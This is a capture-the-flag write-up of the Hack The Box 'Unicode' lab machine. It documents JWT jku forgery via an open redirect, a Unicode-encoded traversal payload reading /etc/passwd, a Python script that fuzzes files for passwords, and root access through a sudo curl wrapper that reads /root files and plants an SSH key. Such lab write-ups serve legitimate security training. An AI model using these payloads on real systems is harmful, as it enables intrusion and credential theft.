@@ -1,0 +1,266 @@
+---
+title: "Unicode Hackthebox writeup"
+author: "0xMesbaha"
+cover: "/media/unicode/20220506203915.png"
+tags: ["Hackthebox", "JWT" , "directory-traversal", "decompile-binary"]
+date: 2022-05-07T12:49:13+10:00
+draft: false
+---
+
+
+In This medium Box we are playing with JWT Tokens in specific the jku Claim Misuse , which will let us login as admin account then we will use the Unicode Encoding to read files on the system. Eventually we will find a password for user then ssh to login. for the root part we are abusing the sudo privilege on a binary which can read files on the system.
+<!--more-->
+
+
+# Scanning
+```bash
+nmap -A -T5 10.10.11.126 -oN nmap/intial.txt
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 fd:a0:f7:93:9e:d3:cc:bd:c2:3c:7f:92:35:70:d7:77 (RSA)
+|   256 8b:b6:98:2d:fa:00:e5:e2:9c:8f:af:0f:44:99:03:b1 (ECDSA)
+|_  256 c9:89:27:3e:91:cb:51:27:6f:39:89:36:10:41:df:7c (ED25519)
+80/tcp open  http    nginx 1.18.0 (Ubuntu)
+|_http-generator: Hugo 0.83.1
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+|_http-title: Hackmedia
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
+
+and the full port scan doesn't reveal more ports.
+
+# Enumeration 
+As we only have the web service to enumerate let's get into it:
+
+![error](/media/unicode/20220506204508.png)
+
+static page doesn't tell much , it has Login and register functions. we can try to do some authentication bypass at login But no results. so let's create an account and login with it 
+
+Once we login we have this ``/dashboard`` page :
+
+![error](/media/unicode/20220506204717.png)
+
+it also has an upload function we can try uploading files But doesn't reveal any indicator where it is uploaded. so we can leave at as the 2nd option for us 
+
+we can notice also the cookie we have :
+
+![error](/media/unicode/20220506204858.png)
+
+Seems like JWT thing we can take it and paste it into [jwt.io](https://jwt.io/)
+
+![error](/media/unicode/20220506205319.png)
+
+
+we can see the url ``http://hackmedia.htb/static/jwks.json``  , adding the  ``hackmedia.htb`` to the ``/etc/hosts`` then viewing the page :
+
+![error](/media/unicode/20220506205439.png)
+
+so it seems it visits this page for the verification process , searching for JWT JKU attacks found this great Article [Here](https://blog.pentesteracademy.com/hacking-jwt-tokens-jku-claim-misuse-2e732109ac1c) and it looks exactly like the situation we have.
+
+**Briefly we will :**
+
+1- Generate public and private key and add them as a signature for the JWT token and change the username to **admin** 
+
+2- in the ``jwks.json``  modify the **n** value with the one we got at generation
+
+3- modify the JKU with your host then host the ``jwks.json`` at our http server . 
+
+By hosting it and make the web application visit us to verify we will login with our forged JWT.
+
+using [here](https://mkjwk.org/) with the following options:
+
+![error](/media/unicode/20220506210001.png)
+
+using the private and public keys at the signature at ``jwt.io`` , and take the **n** value to modify the ``jwks.json`` we will host
+
+![error](/media/unicode/20220506210334.png)
+
+now modify the JKU, username and the Signature:
+
+![error](/media/unicode/20220506210527.png)
+
+now using that JWT as our new cookie we got this and it didn't even make the request to our side.
+
+![error](/media/unicode/20220506210617.png)
+
+digging more and using dirsearch found :
+
+```bash
+308   266B   http://10.10.11.126:80/dashboard    -> REDIRECTS TO: http://10.10.11.126/dashboard/
+308   262B   http://10.10.11.126:80/display    -> REDIRECTS TO: http://10.10.11.126/display/
+308   258B   http://10.10.11.126:80/error    -> REDIRECTS TO: http://10.10.11.126/error/
+308   264B   http://10.10.11.126:80/internal    -> REDIRECTS TO: http://10.10.11.126/internal/
+308   258B   http://10.10.11.126:80/login    -> REDIRECTS TO: http://10.10.11.126/login/
+308   262B   http://10.10.11.126:80/pricing    -> REDIRECTS TO: http://10.10.11.126/pricing/
+308   264B   http://10.10.11.126:80/redirect    -> REDIRECTS TO: http://10.10.11.126/redirect/
+308   264B   http://10.10.11.126:80/register    -> REDIRECTS TO: http://10.10.11.126/register/
+```
+and trying the following it makes the request to our side :
+
+```html
+http://10.10.11.126/redirect?url=10.10.16.39
+```
+![error](/media/unicode/20220506210957.png)
+
+We can try modifying the JKU again with :
+
+![error](/media/unicode/20220506211117.png)
+
+we also got :
+
+![error](/media/unicode/20220506211149.png)
+
+maybe it is checking for the word "static" we can try :
+
+![error](/media/unicode/20220506211238.png)
+
+sending the cookie finally we are in :
+
+![error](/media/unicode/20220506211310.png)
+
+
+<span style="background-color: #FFFF00">**Note** :Don't close your http server as it will request the verify with each request issued</span>
+
+# Foothold
+
+visiting the **last quarter** we can find it issues this request :
+
+```
+http://10.10.11.126/display/?page=quarterly.pdf
+```
+
+we can try directory traversal But it fails , we can make use of the [Unicode_Encoding](https://owasp.org/www-community/attacks/Unicode_Encoding) as the machine name suggests , and using this payload 
+
+```bash
+page=%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/etc/passwd
+```
+	
+![error](/media/unicode/20220506211903.png)
+
+It works , we can try to read the ssh key for the user **code** But we can't. so we can start fuzzing different files on the machine until we got a password for our foothold.
+
+From the ``/etc/passwd`` we can see it has the MYSQL and ngnix Services running we can read their configuration files.
+
+searching online found these default configuration files :
+
+```bash
+/etc/mysql/my.cnf
+/var/lib/mysql/my.cnf
+/var/log/mysql.log
+/etc/nginx/nginx.conf 
+/etc/nginx/sites-available/default
+```
+
+i added some files as well and write down this script searching for passwords:
+```python
+#!/usr/bin/python3
+import requests
+import time
+
+url = 'http://10.10.11.126/display/?page=%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/%EF%B8%B0'
+
+cookie ={
+'auth' : '<your_auth>'	
+}
+with open('wordlist.txt') as wordlist :
+	for word in wordlist:
+		r = requests.get(url+word.strip(),cookies=cookie)
+
+		if 'font' in r.text and 'animation' in r.text :
+			print(f"file {word.strip()} : 404 NOTFOUND")
+		else :
+			print(f"file {word.strip()} : 200 OK")
+			if "pass" in r.text.lower() :
+				print('-'*50)
+				print(r.text)
+				print('-'*50)
+
+		#time.sleep(3)
+```
+
+![error](/media/unicode/20220506224248.png)
+
+
+we can see the comment ``#change the user password from db.yaml`` .we can also it reveals other directories at the home of the user code
+
+```
+/home/code/coder/static/styles/
+/home/code/app/
+```
+
+Eventually will find out the ``db.yaml`` is at ``/home/code/coder/db.yaml`` :
+
+![error](/media/unicode/20220506224642.png)
+
+using this password we can login with ssh successfully
+
+![error](/media/unicode/20220506224830.png)
+# Privilege escalation
+Examining the binary we have :
+
+![error](/media/unicode/20220506225759.png)
+
+so it seems it can take a url and download the content into a file we can read latter:
+
+![error](/media/unicode/20220506231218.png)
+
+After some tinkering around , we can use the ``File://`` wrapper to read local files :"
+
+![error](/media/unicode/20220506232454.png)
+
+and Finally you can read the flag with ``File:///root/root.txt``
+
+
+## Analyzing the binary
+
+Downloading the Binary and start analyzing it , searching online found some tools which can help us de-compile a python binary and the binary we have looks like a python binary indeed
+
+![error](/media/unicode/20220507100201.png)
+
+commands used :
+
+```bash
+git clone https://github.com/LucifielHack/pyinstxtractor.git
+git clone https://github.com/LucifielHack/pycdc.git 
+wget https://github.com/Kitware/CMake/releases/download/v3.23.1/cmake-3.23.1.tar.gz
+tar xzvf cmake-3.23.1.tar.gz
+cd cmake-3.23.1
+./bootstrap
+make
+sudo make install
+cmake ../pycdc/CMakeLists.txt  
+make ../pycdc/
+python3 pyinstxtractor.py <binary>
+./pycdc /binary_extracted/binary.pyc
+```
+
+![error](/media/unicode/20220507100601.png)
+
+And it seems to have a blacklist , also it uses the curl command to download the files . and if we searched online how to read localfiles with curl will see using the ``File://`` wrapper as we did.
+
+
+## Root Access 
+
+now we want to login as root , i have downloaded the root id_rsa But unable to login with it. we can try uploading our public key at the  ``/root/.ssh/authorized_keys`` , then try to connect with our private key.
+
+As we have option to download let's download our public key , But we can't specify where to save it:
+
+![error](/media/unicode/20220507185729.png)
+
+Seems the space is the problem , and hence the **'}'** and **'{'** are not filter we can make use of this technique:
+
+![error](/media/unicode/20220507185909.png)
+
+which the spaces are replaced with the **','**
+
+![error](/media/unicode/20220507191553.png)
+
+then let's connect :
+
+```bash
+ssh -i unicode root@hackmedia.htb
+```
+
+![error](/media/unicode/20220507191635.png)
